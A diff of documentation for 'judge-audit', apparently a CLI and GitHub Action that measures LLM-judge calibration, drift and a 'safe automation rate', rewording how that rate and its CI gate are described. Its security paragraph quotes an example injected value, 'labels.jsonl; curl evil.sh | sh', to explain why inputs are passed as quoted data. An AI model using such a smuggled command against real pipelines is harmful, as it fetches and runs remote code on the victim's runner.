@@ -16,7 +16,7 @@ judge-audit check labels.jsonl --judge jev --baseline audit-result.json --max-ec
 judge-audit check labels.jsonl --judge jev --baseline audit-result.json --min-safe-rate 0.05:0.40
 ```
 
-Every report opens with **"Can I automate this?"**: the **safe automation rate**, the share of the judge's decisions it can take alone at the target error (`--target`, default 5 %; 1, 2, 5 and 10 % as context), with the confidence threshold to deploy, the worst segment and what the rate is valid for ([judges.md § The safe automation rate](judges.md#the-safe-automation-rate)). `--min-safe-rate RISK:SHARE` turns it into a gate: exit `1` when the rate at an error of at most RISK is below SHARE.
+Every report opens with **"Can I automate this?"**: the **safe automation rate**, led by the share of the judge's decisions it can take alone at the error target (`--target`, default 5 %; 1, 2, 5 and 10 % as context), validated on held-out decisions with its 95 % upper bound on the error rate and its range over split seeds, then the confidence threshold to deploy, the worst segment and what the rate is valid for ([judges.md § The safe automation rate](judges.md#the-safe-automation-rate)). `--min-safe-rate RISK:SHARE` turns it into a gate: exit `1` when the share automated on all labelled decisions at a RISK error target is below SHARE.
 
 Exit codes: `0` ok · `1` drift detected · `2` usage or configuration error, or a judge that could not answer (`judge request failed: …`: an HTTP error such as an expired key, or a server that cannot be reached), so a broken credential never reads as drift; `JUDGE_AUDIT_DEBUG=1` shows the traceback. An output that cannot be written exits `2` (`run`: `--out`, `--json`, `--judgments`; `check`: `--out`, `--json`, `--drift`), and a `check` exits `2` for it even when drift was also found: CI treats it as a usage failure to fix before the drift is read. Judges and their environment variables: [judges.md](judges.md). Real vendor runs: [real-audits.md](real-audits.md).
 
@@ -63,9 +63,9 @@ steps:
       baseline: audits/baseline.json           # audit-result.json of the run you signed off
       max-ece-drift: "0.02"
       max-acc-drop: "0.01"
-      target: "0.05"                           # the error rate the safe automation rate is headlined at
+      target: "0.05"                           # the error target the safe automation rate is headlined at
       segment-by: "label"                      # label | meta.FIELD | none: name the worst segment
-      min-safe-rate: "0.05:0.40"               # fail if the safe automation rate at ≤ 5 % error is below 40 %
+      min-safe-rate: "0.05:0.40"               # fail if, at a 5 % error target, under 40 % of all labelled decisions is automated
       fail-on-drift: "true"                    # 'false' = report, expose the `drift` output, do not fail
       allow-incompatible: "false"              # 'true' = compare even if the baseline measured another dataset/judge/n
       upload-evidence: "false"                 # 'true' = also upload the per-decision judgments as an artifact
@@ -74,7 +74,7 @@ steps:
       AI_GATEWAY_API_KEY: ${{ secrets.AI_GATEWAY_API_KEY }}   # jev; llm uses ANTHROPIC_API_KEY or LLM_*
 ```
 
-The markdown report lands in the job summary; on pull requests one comment is created and then updated on every push (marker `<!-- judge-audit:<labels> -->`), with the SIMULATED banner whenever the judge is the simulator. The comment opens with the safe automation rate. Outputs: `accuracy`, `ece`, `zero-error-coverage`, `safe-automation-rate` (at the target), `safe-automation-rates` (e.g. `1%=0.0 2%=0.0 5%=0.41 10%=0.7226`), `n`, `drift`, `report-path`, `result-path`. `min-safe-rate`, `target` and `segment-by` are matched against strict patterns before they reach the CLI. The report, the result JSON and the drift verdict are uploaded as a run artifact. The per-decision judgments are written on the runner but **not** uploaded unless you set `upload-evidence: "true"` — those rows contain the decisions themselves, and an artifact is readable by everyone who can read the repository.
+The markdown report lands in the job summary; on pull requests one comment is created and then updated on every push (marker `<!-- judge-audit:<labels> -->`), with the SIMULATED banner whenever the judge is the simulator. The comment opens with the safe automation rate validated on held-out decisions. Outputs: `accuracy`, `ece`, `zero-error-coverage`, `safe-automation-rate` (at the target, on all labelled decisions), `safe-automation-rates` (e.g. `1%=0.0 2%=0.0 5%=0.41 10%=0.7226`), `n`, `drift`, `report-path`, `result-path`. `min-safe-rate`, `target` and `segment-by` are matched against strict patterns before they reach the CLI. The report, the result JSON and the drift verdict are uploaded as a run artifact. The per-decision judgments are written on the runner but **not** uploaded unless you set `upload-evidence: "true"` — those rows contain the decisions themselves, and an artifact is readable by everyone who can read the repository.
 
 **The Action treats its inputs as data.** Every input reaches the shell through `env:` and is used quoted; none is interpolated into a script, where a value like `labels.jsonl; curl evil.sh | sh` would be executed rather than read. `mode` is checked against `run | check` before anything runs, `extras` against a character allowlist, and there is no `eval` anywhere. `tests/test_action_yaml.py` fails the build if an `${{ inputs.* }}` ever reappears inside a `run:` block.
 
